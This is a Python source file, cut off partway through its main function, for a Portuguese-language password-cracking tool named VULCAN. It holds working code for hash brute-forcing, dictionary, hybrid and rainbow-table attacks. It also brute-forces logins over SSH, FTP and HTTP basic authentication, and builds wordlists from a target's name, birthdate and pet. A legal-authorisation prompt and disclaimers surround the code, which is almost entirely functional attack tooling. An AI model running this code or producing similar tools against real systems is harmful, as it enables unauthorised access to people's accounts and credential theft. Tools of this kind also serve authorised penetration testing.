#!/usr/bin/env python3
"""
██╗    ██╗███╗   ██╗██╗      █████╗  ██████╗███╗   ██╗    ████████╗ ██████╗ ██████╗  ██████╗
██║    ██║████╗  ██║██║     ██╔══██╗██╔════╝████╗  ██║    ╚══██╔══╝██╔═══██╗██╔══██╗██╔═══██╗
██║ █╗ ██║██╔██╗ ██║██║     ███████║██║     ██╔██╗ ██║       ██║   ██║   ██║██████╔╝██║   ██║
██║███╗██║██║╚██╗██║██║     ██╔══██║██║     ██║╚██╗██║       ██║   ██║   ██║██╔══██╗██║   ██║
╚███╔███╔╝██║ ╚████║███████╗██║  ██║╚██████╗██║ ╚████║       ██║   ╚██████╔╝██║  ██║╚██████╔╝
 ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═══╝       ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝
                                                                                          
SUPER FERRAMENTA BRUTE FORCE - CYBERSECURITY PROFISSIONAL
Desenvolvido por: Leonardo Pereira | Ethical Hacker
Versão: 3.0 | Codinome: "Cyberghost"
"""

import argparse
import hashlib
import itertools
import string
import time
import sys
import os
import threading
import queue
import multiprocessing
from datetime import datetime
from colorama import init, Fore, Style
import requests
import socket
import ssl
import paramiko
import ftplib
import smtplib
import json
import base64
import zipfile
import pickle
import sqlite3
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import warnings
warnings.filterwarnings('ignore')

init(autoreset=True)

class SuperBruteForceProfessional:
    def __init__(self):
        self.version = "3.0"
        self.author = "Leonardo Pereira"
        self.callsign = "VULCAN"
        self.attempts = 0
        self.found = 0
        self.start_time = None
        self.running = False
        self.lock = threading.Lock()
        self.results = []
        self.wordlists_loaded = 0
        self.session_stats = {
            'total_attempts': 0,
            'successful_cracks': 0,
            'failed_attempts': 0,
            'average_speed': 0,
            'max_speed': 0
        }
        
        # Instanciar classes internas
        self.hash_cracker = self.HashCracker()
        self.password_generator = self.PasswordGenerator()
        self.network_attacker = self.NetworkAttacker()
        
    def print_banner(self):
        """Exibe banner profissional"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗
{Fore.RED}║{Fore.YELLOW} ██╗   ██╗██╗   ██╗██╗      █████╗  ██████╗███╗   ██╗{Fore.CYAN} ████████╗ ██████╗ ██████╗  ██████╗{Fore.RED} ║
{Fore.RED}║{Fore.YELLOW} ██║   ██║██║   ██║██║     ██╔══██╗██╔════╝████╗  ██║{Fore.CYAN} ╚══██╔══╝██╔═══██╗██╔══██╗██╔═══██╗{Fore.RED} ║
{Fore.RED}║{Fore.YELLOW} ██║   ██║██║   ██║██║     ███████║██║     ██╔██╗ ██║{Fore.CYAN}    ██║   ██║   ██║██████╔╝██║   ██║{Fore.RED} ║
{Fore.RED}║{Fore.YELLOW} ██║   ██║██║   ██║██║     ██╔══██║██║     ██║╚██╗██║{Fore.CYAN}    ██║   ██║   ██║██╔══██╗██║   ██║{Fore.RED} ║
{Fore.RED}║{Fore.YELLOW} ╚██████╔╝╚██████╔╝███████╗██║  ██║╚██████╗██║ ╚████║{Fore.CYAN}    ██║   ╚██████╔╝██║  ██║╚██████╔╝{Fore.RED} ║
{Fore.RED}║{Fore.YELLOW}  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═══╝{Fore.CYAN}    ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ {Fore.RED}║
{Fore.RED}╠══════════════════════════════════════════════════════════════════════════════╣
{Fore.RED}║{Fore.WHITE}                         BRUTE FORCE PROFESSIONAL SUITE                      {Fore.RED}║
{Fore.RED}║{Fore.GREEN}                    Versão: {self.version} | Codinome: {self.callsign}                    {Fore.RED}║
{Fore.RED}║{Fore.CYAN}                   Desenvolvido por: {self.author}                        {Fore.RED}║
{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}[!]{Style.RESET_ALL} {Fore.WHITE}ESTA FERRAMENTA É PARA USO EXCLUSIVO EM TESTES AUTORIZADOS{Style.RESET_ALL}
{Fore.RED}[!]{Style.RESET_ALL} {Fore.WHITE}USO NÃO AUTORIZADO É CRIME PUNÍVEL POR LEI{Style.RESET_ALL}
        """
        print(banner)
        
    def check_legal(self):
        """Verificação legal rigorosa"""
        print(f"{Fore.YELLOW}════════════════════════════ VERIFICAÇÃO LEGAL ════════════════════════════{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Você está prestes a usar uma ferramenta de segurança avançada")
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Responda honestamente às seguintes questões legais:\n")
        
        questions = [
            "1. Você possui autorização POR ESCRITO do proprietário do sistema alvo?",
            "2. Está realizando um pentest autorizado ou exercício de Red Team?",
            "3. Você é o proprietário do sistema que será testado?",
            "4. Está em ambiente de laboratório controlado/isolado?",
            "5. Assumirá total responsabilidade pelo uso desta ferramenta?"
        ]
        
        for question in questions:
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} {question}")
            resp = input(f"{Fore.GREEN}[>]{Style.RESET_ALL} (s/N): ").lower()
            if resp != 's':
                print(f"\n{Fore.RED}[!] ACESSO NEGADO! Condições legais não atendidas.{Style.RESET_ALL}")
                print(f"{Fore.RED}[!] Encerrando sistema...{Style.RESET_ALL}")
                sys.exit(0)
        
        print(f"\n{Fore.GREEN}[+] Verificação legal concluída com sucesso!{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Inicializando sistema VULCAN...{Style.RESET_ALL}\n")
        
    class HashCracker:
        """Módulo avançado de quebra de hashes"""
        @staticmethod
        def identify_hash(hash_string):
            """Identifica o tipo de hash"""
            hash_patterns = {
                32: 'md5',
                40: 'sha1',
                64: 'sha256',
                56: 'sha224',
                96: 'sha384',
                128: 'sha512',
                8: 'crc32'
            }
            length = len(hash_string)
            return hash_patterns.get(length, 'unknown')
        
        @staticmethod
        def advanced_hash(password, algorithm='md5', salt=None, iterations=1):
            """Gera hash avançado com salt e iterations"""
            if salt:
                password = salt + password
            
            hashed_password = password
            
            try:
                if algorithm.lower() == 'md5':
                    for _ in range(iterations):
                        hashed_password = hashlib.md5(hashed_password.encode()).hexdigest()
                elif algorithm.lower() == 'sha1':
                    for _ in range(iterations):
                        hashed_password = hashlib.sha1(hashed_password.encode()).hexdigest()
                elif algorithm.lower() == 'sha256':
                    for _ in range(iterations):
                        hashed_password = hashlib.sha256(hashed_password.encode()).hexdigest()
                elif algorithm.lower() == 'sha512':
                    for _ in range(iterations):
                        hashed_password = hashlib.sha512(hashed_password.encode()).hexdigest()
                elif algorithm.lower() == 'ntlm':
                    # Import hashlib locally to avoid conflict
                    hashed_password = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
                else:
                    # Fallback to MD5 if unknown algorithm
                    hashed_password = hashlib.md5(password.encode()).hexdigest()
            except Exception as e:
                print(f"Hash generation error: {e}")
                return None
            
            return hashed_password
    
    class NetworkAttacker:
        """Módulo de ataques de rede"""
        @staticmethod
        def ssh_brute(host, port=22, username=None, wordlist=None, timeout=5):
            """Brute force SSH"""
            results = []
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f]
            except FileNotFoundError:
                return results
            
            for password in passwords:
                try:
                    ssh.connect(host, port=port, username=username, 
                               password=password, timeout=timeout, banner_timeout=timeout)
                    results.append({'host': host, 'port': port, 
                                   'username': username, 'password': password})
                    ssh.close()
                    break
                except:
                    continue
            
            return results
        
        @staticmethod
        def ftp_brute(host, port=21, username=None, wordlist=None, timeout=5):
            """Brute force FTP"""
            results = []
            
            try:
                with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f]
            except FileNotFoundError:
                return results
            
            for password in passwords:
                try:
                    ftp = ftplib.FTP()
                    ftp.connect(host, port, timeout=timeout)
                    ftp.login(username, password)
                    results.append({'host': host, 'port': port,
                                   'username': username, 'password': password})
                    ftp.quit()
                    break
                except:
                    continue
            
            return results
        
        @staticmethod
        def http_auth_brute(url, username, wordlist, auth_type='basic'):
            """Brute force HTTP Authentication"""
            results = []
            
            try:
                with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f]
            except FileNotFoundError:
                return results
            
            for password in passwords:
                try:
                    if auth_type == 'basic':
                        response = requests.get(url, auth=(username, password), timeout=10)
                        if response.status_code == 200:
                            results.append({'url': url, 'username': username,
                                          'password': password})
                            break
                except requests.RequestException:
                    continue
            
            return results
    
    class PasswordGenerator:
        """Gerador avançado de senhas"""
        @staticmethod
        def generate_advanced_wordlist(rules=None):
            """Gera wordlist baseada em regras"""
            if rules is None:
                rules = {
                    'min_length': 4,
                    'max_length': 6,  # Reduzido para melhor performance
                    'use_lowercase': True,
                    'use_uppercase': True,
                    'use_digits': True,
                    'use_special': True,
                    'common_words': ['admin', 'password', 'test', 'user']
                }
            
            charset = ''
            if rules['use_lowercase']:
                charset += string.ascii_lowercase
            if rules['use_uppercase']:
                charset += string.ascii_uppercase
            if rules['use_digits']:
                charset += string.digits
            if rules['use_special']:
                charset += '!@#$%'
            
            wordlist = []
            
            # Adiciona palavras comuns
            for word in rules['common_words']:
                wordlist.append(word)
                wordlist.append(word + '123')
                wordlist.append(word + '!')
                wordlist.append(word.capitalize() + '123')
            
            # Gera combinações (limitado para performance)
            max_combinations = 50000
            
            for length in range(rules['min_length'], rules['max_length'] + 1):
                # Para combinações muito grandes, usa amostragem
                if len(charset) ** length > 50000:
                    import random
                    for _ in range(10000):
                        attempt = ''.join(random.choice(charset) for _ in range(length))
                        wordlist.append(attempt)
                else:
                    # Para combinações menores, gera todas
                    for combination in itertools.product(charset, repeat=length):
                        wordlist.append(''.join(combination))
                        if len(wordlist) >= max_combinations:
                            return wordlist[:max_combinations]
                
                if len(wordlist) >= max_combinations:
                    break
            
            return list(set(wordlist))[:max_combinations]
    
        @staticmethod
        def create_targeted_wordlist(target_info=None):
            """Cria wordlist direcionada baseada em informações do alvo"""
            if target_info is None:
                target_info = {}
            
            wordlist = []
            
            # Informações pessoais
            if 'name' in target_info:
                name = target_info['name'].lower()
                wordlist.extend([name, name + '123', name + '!', name.capitalize()])
            
            if 'birthdate' in target_info:
                bd = target_info['birthdate'].replace('/', '')
                wordlist.extend([bd, bd[:4], bd[4:], bd + '!'])
            
            if 'pet' in target_info:
                pet = target_info['pet'].lower()
                wordlist.extend([pet, pet + '123', pet.capitalize()])
            
            # Combinações comuns
            common = ['password', 'admin', '123456', 'qwerty', 'letmein', 'welcome']
            wordlist.extend(common)
            
            # Anos
            for year in range(1970, 2024):
                wordlist.append(str(year))
            
            return list(set(wordlist))  # Remove duplicatas
    
    def rainbow_table_attack(self, target_hash, rainbow_file='rainbow.db'):
        """Ataque usando rainbow table"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Iniciando ataque com Rainbow Table...")
        
        if not os.path.exists(rainbow_file):
            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Rainbow table não encontrada. Criando uma nova...")
            self.create_rainbow_table(rainbow_file)
        
        conn = sqlite3.connect(rainbow_file)
        cursor = conn.cursor()
        
        cursor.execute("SELECT password FROM rainbow WHERE hash=?", (target_hash,))
        result = cursor.fetchone()
        
        conn.close()
        
        if result:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Senha encontrada na rainbow table!")
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Senha: {result[0]}")
            return result[0]
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Senha não encontrada na rainbow table")
            return None
    
    def hybrid_attack(self, target_hash, wordlist_file, algorithm='md5', 
                 mask_pattern=None, rules_file=None):
        """Ataque híbrido (dicionário + brute force)"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Iniciando ataque híbrido...")
        
        # Carrega wordlist fornecida primeiro
        wordlist = []
        if wordlist_file and os.path.exists(wordlist_file):
            try:
                with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                    wordlist = [line.strip() for line in f]
                print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Palavras carregadas da wordlist: {len(wordlist)}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Erro ao carregar wordlist: {e}")
                print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Gerando wordlist automaticamente...")
                wordlist = self.password_generator.generate_advanced_wordlist()
        else:
            wordlist = self.password_generator.generate_advanced_wordlist()
        
        total_tested = 0
        found = None
        
        for base in wordlist:
            if not mask_pattern:
                variations = self.generate_variations(base)
            else:
                variations = self.apply_mask(base, mask_pattern)
            
            for variation in variations:
                total_tested += 1
                hashed = self.hash_cracker.advanced_hash(variation, algorithm)
                
                if total_tested % 1000 == 0:
                    print(f"\r{Fore.YELLOW}[*]{Style.RESET_ALL} Testadas: {total_tested} | Última: {variation[:20]}", end="")
                
                if hashed == target_hash:
                    print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} SENHA ENCONTRADA!")
                    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Hash: {target_hash}")
                    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Senha: {variation}")
                    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Tentativas: {total_tested}")
                    found = variation
                    break
            
            if found:
                break
        
        if not found:
            print(f"\n{Fore.RED}[-]{Style.RESET_ALL} Senha não encontrada no ataque híbrido")
        
        return found
    
    def apply_mask(self, word, mask):
        """Aplica máscara a uma palavra"""
        variations = []
        
        # Exemplo de máscara simples
        if '?l' in mask:
            variations.append(word.lower())
        if '?u' in mask:
            variations.append(word.upper())
        if '?d' in mask:
            for i in range(10):
                variations.append(word + str(i))
                variations.append(str(i) + word)
        if '?s' in mask:
            for special in ['!', '@', '#', '$', '%']:
                variations.append(word + special)
                variations.append(special + word)
        
        return variations
    
    def generate_variations(self, word):
        """Gera variações de uma palavra"""
        variations = []
        
        # Variações básicas
        variations.append(word)  # Original
        variations.append(word.lower())  # Minúsculas
        variations.append(word.upper())  # Maiúsculas
        variations.append(word.capitalize())  # Capitalizada
        
        # Adições comuns
        for year in ['2023', '2024', '123', '1234', '12345']:
            variations.append(word + year)
            variations.append(word.capitalize() + year)
        
        # Substituições leet speak
        leet = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
        leet_word = word.lower()
        for char, num in leet.items():
            leet_word = leet_word.replace(char, num)
        variations.append(leet_word)
        
        # Adição de caracteres especiais
        for special in ['!', '@', '#', '$', '%', '&', '*']:
            variations.append(word + special)
            variations.append(special + word)
        
        return list(set(variations))  # Remove duplicatas
    
    def distributed_attack(self, target_hash, algorithm='md5', nodes=2):
        """Simula ataque distribuído (multi-processos)"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Iniciando ataque distribuído com {nodes} núcleos...")
        
        charset = string.ascii_lowercase + string.digits
        chunk_size = 10000
        
        def worker(start_char, result_queue):
            local_found = None
            local_tested = 0
            
            # Testa combinações de 1-4 caracteres
            for length in range(1, 5):
                for combo in itertools.product(charset, repeat=length):
                    if local_tested >= chunk_size:
                        break
                    
                    attempt = ''.join(combo)
                    # Filtra por caractere inicial para distribuição
                    if start_char and not attempt.startswith(start_char):
                        continue
                    
                    hashed = self.hash_cracker.advanced_hash(attempt, algorithm)
                    local_tested += 1
                    
                    if hashed == target_hash:
                        result_queue.put(attempt)
                        return
            
            result_queue.put(None)
        
        # Cria processos
        result_queue = multiprocessing.Queue()
        processes = []
        
        # Divide o trabalho por caracteres iniciais
        chars_to_distribute = list(charset[:min(nodes, len(charset))])
        
        for i in range(min(nodes, len(chars_to_distribute))):
            p = multiprocessing.Process(target=worker, args=(chars_to_distribute[i], result_queue))
            processes.append(p)
            p.start()
        
        # Aguarda resultados
        found_password = None
        for p in processes:
            p.join()
        
        # Verifica resultados
        while not result_queue.empty():
            result = result_queue.get()
            if result:
                found_password = result
                break
        
        if found_password:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Senha encontrada: {found_password}")
        else:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Senha não encontrada")
        
        return found_password
    
    def intelligent_brute(self, target_hash, algorithm='md5', ai_model=None):
        """Brute force inteligente com aprendizado"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Iniciando brute force inteligente...")
        
        # Padrões comuns de senha
        common_patterns = []
        
        # Senhas baseadas em datas (limitado para performance)
        for y in range(2020, 2025):
            for m in range(1, 13):
                for d in range(1, 32):
                    common_patterns.append(f"{d:02d}{m:02d}{y}")
                    common_patterns.append(f"{y}{m:02d}{d:02d}")
        
        # Sequências de teclado
        common_patterns.extend(['qwerty', 'qwerty123', 'asdfgh', 'zxcvbn', '1qaz2wsx'])
        
        # Senhas comuns
        common_patterns.extend(['password', '123456', 'admin', 'welcome', 'monkey', 'letmein'])
        
        # Nomes comuns
        common_patterns.extend(['john', 'jane', 'admin', 'user', 'test', 'guest', 'root'])
        
        # Testa cada padrão
        for attempt in common_patterns:
            self.attempts += 1
            hashed = self.hash_cracker.advanced_hash(attempt, algorithm)
            
            if self.attempts % 100 == 0:
                elapsed = time.time() - self.start_time if self.start_time else 0
                speed = self.attempts / max(elapsed, 0.001)
                print(f"\r{Fore.YELLOW}[*]{Style.RESET_ALL} Tentativas: {self.attempts} | "
                      f"Velocidade: {speed:.0f}/s | Testando: {attempt}", end="")
            
            if hashed == target_hash:
                print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} SENHA ENCONTRADA!")
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Hash: {target_hash}")
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Senha: {attempt}")
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Tentativas: {self.attempts}")
                return attempt
        
        print(f"\n{Fore.RED}[-]{Style.RESET_ALL} Senha não encontrada nos padrões comuns")
        return None
    
    def create_rainbow_table(self, output_file='rainbow.db', algorithm='md5'):
        """Cria rainbow table personalizada"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Criando rainbow table...")
        
        conn = sqlite3.connect(output_file)
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS rainbow
                        (hash TEXT PRIMARY KEY, password TEXT)''')
        
        # Gera hashes para senhas comuns (limitado para performance)
        common_passwords = self.password_generator.generate_advanced_wordlist()
        
        for i, password in enumerate(common_passwords):
            if i % 1000 == 0:
                print(f"\r{Fore.YELLOW}[*]{Style.RESET_ALL} Processadas: {i}/{len(common_passwords)}", end="")
            
            hashed = self.hash_cracker.advanced_hash(password, algorithm)
            cursor.execute("INSERT OR IGNORE INTO rainbow VALUES (?, ?)", (hashed, password))
        
        conn.commit()
        conn.close()
        
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Rainbow table criada: {output_file}")
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Entradas: {len(common_passwords)}")
    
    def export_results(self, format='json', filename=None):
        """Exporta resultados em vários formatos"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"vulcan_results_{timestamp}.{format}"
        
        data = {
            'tool': 'VULCAN Brute Force Professional',
            'version': self.version,
            'author': self.author,
            'timestamp': datetime.now().isoformat(),
            'results': self.results,
            'statistics': self.session_stats
        }
        
        if format == 'json':
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
        elif format == 'csv':
            import csv
            with open(filename, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['Hash', 'Password', 'Attempts', 'Time', 'Algorithm'])
                for result in self.results:
                    writer.writerow([
                        result.get('hash', ''),
                        result.get('password', ''),
                        result.get('attempts', 0),
                        result.get('time', 0),
                        result.get('algorithm', '')
                    ])
        elif format == 'html':
            html = f"""
            <html>
            <head>
                <title>VULCAN Results</title>
                <style>
                    body {{ font-family: Arial, sans-serif; margin: 40px; }}
                    .header {{ background: #333; color: white; padding: 20px; }}
                    .result {{ border: 1px solid #ddd; padding: 15px; margin: 10px 0; }}
                    .success {{ background: #d4edda; }}
                </style>
            </head>
            <body>
                <div class="header">
                    <h1>VULCAN Brute Force Results</h1>
                    <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                </div>
            """
            
            for result in self.results:
                html += f"""
                <div class="result success">
                    <h3>Password Found!</h3>
                    <p><strong>Hash:</strong> {result.get('hash', '')}</p>
                    <p><strong>Password:</strong> {result.get('password', '')}</p>
                    <p><strong>Attempts:</strong> {result.get('attempts', 0)}</p>
                    <p><strong>Time:</strong> {result.get('time', 0):.2f} seconds</p>
                </div>
                """
            
            html += "</body></html>"
            
            with open(filename, 'w') as f:
                f.write(html)
        
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Resultados exportados para: {filename}")
        return filename
    
    def generate_report(self, detailed=True):
        """Gera relatório profissional"""
        print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}                      RELATÓRIO PROFISSIONAL VULCAN{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        
        total_time = time.time() - self.start_time if self.start_time else 0
        success_rate = (self.session_stats['successful_cracks'] / 
                       max(self.session_stats['total_attempts'], 1)) * 100
        
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Estatísticas da Sessão:")
        print(f"    • Tentativas totais: {self.session_stats['total_attempts']:,}")
        print(f"    • Senhas quebradas: {self.session_stats['successful_cracks']}")
        print(f"    • Taxa de sucesso: {success_rate:.2f}%")
        print(f"    • Tempo total: {total_time:.2f} segundos")
        print(f"    • Velocidade média: {self.session_stats['average_speed']:.0f} tentativas/segundo")
        print(f"    • Velocidade máxima: {self.session_stats['max_speed']:.0f} tentativas/segundo")
        
        if self.results and detailed:
            print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Resultados detalhados:")
            for i, result in enumerate(self.results, 1):
                print(f"\n    {Fore.GREEN}[{i}]{Style.RESET_ALL} Descoberta #{i}:")
                print(f"        • Senha: {result.get('password', 'N/A')}")
                print(f"        • Hash: {result.get('hash', 'N/A')}")
                print(f"        • Tentativas: {result.get('attempts', 0):,}")
                print(f"        • Tempo: {result.get('time', 0):.2f}s")
                print(f"        • Algoritmo: {result.get('algorithm', 'N/A')}")
        
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Recomendações de Segurança:")
        print(f"    1. Use senhas com pelo menos 12 caracteres")
        print(f"    2. Combine maiúsculas, minúsculas, números e símbolos")
        print(f"    3. Evite palavras do dicionário")
        print(f"    4. Use gerenciador de senhas")
        print(f"    5. Ative autenticação de dois fatores")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")

    def simple_brute_force(self, target_hash, algorithm='md5', max_length=5):
        """Brute force simples com comprimento máximo"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Iniciando brute force simples...")
        
        charset = string.ascii_lowercase + string.digits
        
        for length in range(1, max_length + 1):
            print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Testando senhas com {length} caracteres...")
            
            for combo in itertools.product(charset, repeat=length):
                attempt = ''.join(combo)
                hashed = self.hash_cracker.advanced_hash(attempt, algorithm)
                self.attempts += 1
                
                if self.attempts % 10000 == 0:
                    elapsed = time.time() - self.start_time
                    speed = self.attempts / elapsed if elapsed > 0 else 0
                    print(f"\r{Fore.YELLOW}[*]{Style.RESET_ALL} Tentativas: {self.attempts} | "
                          f"Velocidade: {speed:.0f}/s | Testando: {attempt}", end="")
                
                if hashed == target_hash:
                    print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} SENHA ENCONTRADA!")
                    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Hash: {target_hash}")
                    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Senha: {attempt}")
                    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Tentativas: {self.attempts}")
                    return attempt
        
        print(f"\n{Fore.RED}[-]{Style.RESET_ALL} Senha não encontrada")
        return None

    def dictionary_attack(self, target_hash, wordlist_file, algorithm='md5'):
        """Ataque de dicionário básico"""
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Iniciando ataque de dicionário...")
        
        if not os.path.exists(wordlist_file):
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Arquivo de wordlist não encontrado: {wordlist_file}")
            return None
        
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                wordlist = [line.strip() for line in f]
        except Exception as e:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Erro ao ler wordlist: {e}")
            return None
        
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Palavras carregadas: {len(wordlist)}")
        
        for i, word in enumerate(wordlist):
            hashed = self.hash_cracker.advanced_hash(word, algorithm)
            self.attempts += 1
            
            if i % 1000 == 0:
                elapsed = time.time() - self.start_time
                speed = i / elapsed if elapsed > 0 else 0
                print(f"\r{Fore.YELLOW}[*]{Style.RESET_ALL} Testadas: {i}/{len(wordlist)} | "
                      f"Velocidade: {speed:.0f}/s | Testando: {word[:30]}", end="")
            
            if hashed == target_hash:
                print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} SENHA ENCONTRADA!")
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Hash: {target_hash}")
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Senha: {word}")
                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Tentativas: {self.attempts}")
                return word
        
        print(f"\n{Fore.RED}[-]{Style.RESET_ALL} Senha não encontrada na wordlist")
        return None

def check_dependencies():
    """Verifica e instala dependências automaticamente"""
    required = {
        'paramiko': 'paramiko',
        'requests': 'requests', 
        'colorama': 'colorama'
    }
    
    missing = []
    for module_name, package_name in required.items():
        try:
            __import__(module_name)
        except ImportError:
            missing.append(package_name)
    
    if missing:
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Dependências faltando: {', '.join(missing)}")
        print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Tentando instalar automaticamente...")
        
        try:
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Dependências instaladas com sucesso!")
            # Reinicia o script para carregar os módulos
            os.execv(sys.executable, [sys.executable] + sys.argv)
        except Exception as e:
            print(f"{Fore.RED}[-]{Style.RESET_ALL} Falha ao instalar dependências: {e}")
            print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Instale manualmente: pip install {' '.join(missing)}")
            sys.exit(1)

def main():
    # Verificar dependências primeiro
    check_dependencies()
    
    parser = argparse.ArgumentParser(
        description='VULCAN - Super Ferramenta Brute Force Professional',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Exemplos de uso:
  %(prog)s --hash 5f4dcc3b5aa765d61d8327deb882cf99 --mode hybrid --wordlist rockyou.txt
  %(prog)s --hash 5f4dcc3b5aa765d61d8327deb882cf99 --mode rainbow
  %(prog)s --target ssh://192.168.1.1 --username admin --service ssh
  %(prog)s --create-rainbow --algorithm sha256 --output rainbow.db
  
ATENÇÃO: Use apenas em sistemas próprios ou com autorização explícita!
        '''
    )
    
    # Grupo principal
    parser.add_argument('--hash', help='Hash alvo para quebrar')
    parser.add_argument('--target', help='Alvo de rede (URL, IP, etc.)')
    parser.add_argument('--mode', choices=['simple', 'dictionary', 'hybrid', 
                                          'rainbow', 'distributed', 'intelligent'],
                       default='intelligent', help='Modo de ataque')
    parser.add_argument('--algorithm', choices=['md5', 'sha1', 'sha256', 'sha512', 'ntlm'],
                       default='md5', help='Algoritmo de hash')
    
    # Opções de wordlist
    parser.add_argument('--wordlist', help='Arquivo de wordlist')
    parser.add_argument('--generate-wordlist', action='store_true',
                       help='Gerar wordlist personalizada')
    parser.add_argument('--rules', help='Arquivo de regras para geração')
    
    # Opções de rede
    parser.add_argument('--service', choices=['ssh', 'ftp', 'http', 'smtp'],
                       help='Serviço para brute force de rede')
    parser.add_argument('--username', help='Nome de usuário para ataques de rede')
    parser.add_argument('--port', type=int, help='Porta do serviço')
    
    # Opções avançadas
    parser.add_argument('--create-rainbow', action='store_true',
                       help='Criar rainbow table')
    parser.add_argument('--nodes', type=int, default=2,
                       help='Número de núcleos para ataque distribuído')
    parser.add_argument('--export', choices=['json', 'csv', 'html'],
                       help='Exportar resultados em formato específico')
    parser.add_argument('--no-report', action='store_true',
                       help='Não gerar relatório final')
    parser.add_argument('--max-length', type=int, default=5,
                       help='Comprimento máximo para brute force simples')
    
    args = parser.parse_args()
    
    # Inicializar sistema
    tool = SuperBruteForceProfessional()
    tool.print_banner()
    tool.check_legal()
    
    try:
        tool.start_time = time.time()
        
        if args.create_rainbow:
            tool.create_rainbow_table(algorithm=args.algorithm)
            sys.exit(0)
        
        if args.hash:
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Alvo identificado: {args.hash}")
            hash_type = tool.hash_cracker.identify_hash(args.hash)
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Tipo de hash detectado: {hash_type}")
            
            result = None
            if args.mode == 'simple':
                result = tool.simple_brute_force(args.hash, algorithm=args.algorithm, max_length=args.max_length)
            elif args.mode == 'dictionary':
                if not args.wordlist:
                    print(f"{Fore.RED}[-]{Style.RESET_ALL} Wordlist necessária para modo dicionário")
                    sys.exit(1)
                result = tool.dictionary_attack(args.hash, args.wordlist, args.algorithm)
            elif args.mode == 'hybrid':
